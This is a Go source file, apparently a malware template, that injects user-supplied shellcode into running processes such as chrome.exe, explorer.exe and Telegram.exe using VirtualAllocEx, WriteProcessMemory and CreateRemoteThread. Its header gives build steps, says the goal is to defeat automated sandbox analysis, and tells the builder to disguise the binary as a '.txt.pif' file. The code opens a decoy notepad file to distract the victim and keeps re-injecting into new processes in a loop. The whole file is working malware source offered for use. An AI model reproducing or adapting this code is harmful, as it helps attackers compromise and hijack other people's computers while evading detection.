/*
Author: @thedevilroot
Date: 08/10/2020	(gg/mm/yyyy)
Description: Injects shellcode into a process memory after notepad is closed.
Usage:
	1. See comments
	2. Run, in a terminal in the same folder as the script, this command: go build -ldflags="-w -s" -H=windowsgui afternotepad.go
	3. Rename the output to "whatever.txt.pif". (note: remove the .exe extension)
	4. Done!
Scope: Defeating automated sandbox analysis.
Note: .pif files are a little more suspicious (to avs, humans won't see the extension normally), could trigger (in little amount) some false positives.
*/

package main

// Add the imports you need
import (
	"log"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"

	"github.com/TheTitanrain/w32"
)

func executenotepad() {
	os.Chdir(os.TempDir())                   // Moving to %temp%
	f, err := os.Create("msdtu.txt")         // Txt file name
	fakepath := os.TempDir() + "\\msdtu.txt" // Path to open with notepad (%temp%\filename.txt)
	if err != nil {
		log.Fatal(err)
	}

	defer f.Close()

	_, err2 := f.WriteString("notepad go brrrr") // String that will get displayed into the notepad

	if err2 != nil {
		log.Fatal(err2)
	}
	exec.Command("notepad.exe", fakepath).Run() // Running notepad, finishes when notepad is stopped

}

var procList = map[interface{}]interface{}{
	// enter target processes here, the more the better..
	"OneDrive.exe":  0,
	"Telegram.exe":  0,
	"Spotify.exe":   0,
	"Messenger.exe": 0,
	"explorer.exe":  0,
	"chrome.exe":    0,
	"firefox.exe":   0,
}
var targetedPids []uint32

func messagebox() { // Put this into main if you want to show a messagebox
	user32 := syscall.MustLoadDLL("user32.dll")
	mbox := user32.MustFindProc("MessageBoxW")

	title := "Error:"                 // Title duh
	message := "Fatal error occured." // Message ofc
	mbox.Call(0,
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(message))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),
		0)
}

func getprocname(id uint32) string {
	snapshot := w32.CreateToolhelp32Snapshot(w32.TH32CS_SNAPMODULE, id)
	var me w32.MODULEENTRY32
	me.Size = uint32(unsafe.Sizeof(me))
	if w32.Module32First(snapshot, &me) {
		return w32.UTF16PtrToString(&me.SzModule[0])
	}
	return ""
}

func checkPid(pid uint32) bool {
	// check if pid evaluates to true or if pid is in targetedPids slice-
	// return false else return true
	if pid > 0 {
		for _, val := range targetedPids {
			if pid == val {
				return false
			}
		}
		return true
	}
	return false
}

func getPids() {
	size := uint32(1000)
	procs := make([]uint32, size)
	var bytesReturned uint32
	for {
		for proc := range procList {
			if w32.EnumProcesses(procs, size, &bytesReturned) {
				for _, pid := range procs[:int(bytesReturned)/4] {
					if getprocname(pid) == proc {
						// if pid is valid set procList's corresponding key equal to pid
						if checkPid(pid) {
							procList[proc] = pid
						}
					} else {
						// sleep 15 milliseconds to limit cpu usage
						time.Sleep(15 * time.Millisecond)
					}
				}
			}
		}
	}
}

func clearPids() {
	// decrease/increase time based on procList length
	for {
		time.Sleep(15 * time.Minute)
		targetedPids = targetedPids[:0]
	}
}

func callcontact(shellcode []byte, pid uint32) {
	MEM_COMMIT := uintptr(0x1000)
	PAGE_EXECUTE_READWRITE := uintptr(0x40)
	PROCESS_ALL_ACCESS := uintptr(0x1F0FFF)

	// obtain necessary winapi functions from kernel32 for process injection
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	openproc := kernel32.MustFindProc("OpenProcess")
	vallocex := kernel32.MustFindProc("VirtualAllocEx")
	writeprocmem := kernel32.MustFindProc("WriteProcessMemory")
	createremthread := kernel32.MustFindProc("CreateRemoteThread")
	closehandle := kernel32.MustFindProc("CloseHandle")

	// inject & execute shellcode in target process' space
	processHandle, _, _ := openproc.Call(PROCESS_ALL_ACCESS,
		0,
		uintptr(pid))
	remoteBuf, _, _ := vallocex.Call(processHandle,
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT,
		PAGE_EXECUTE_READWRITE)
	writeprocmem.Call(processHandle,
		remoteBuf,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0)
	createremthread.Call(processHandle,
		0,
		0,
		remoteBuf,
		0,
		0,
		0)
	closehandle.Call(processHandle)
}

func main() {
	// enter shellcode here in 0x00/num format
	shellcode := []byte{0x00, 0x00, 0x00}

	// thread to distract user with inauthentic error message
	executenotepad()

	// thread to scan for target pids
	go getPids()

	// thread to clear targetedPids slice to limit amount of memory used
	go clearPids()

	// recursively iterate over procList's pids and filter out valid targets-
	// sleeps are to limit cpu usage
	for {
		time.Sleep(1 * time.Second)
		for _, val := range procList {
			pid, _ := val.(uint32)
			if checkPid(pid) {
				callcontact(shellcode, pid)
				targetedPids = append(targetedPids, pid)
			} else {
				time.Sleep(1 * time.Second)
			}
		}
	}
}
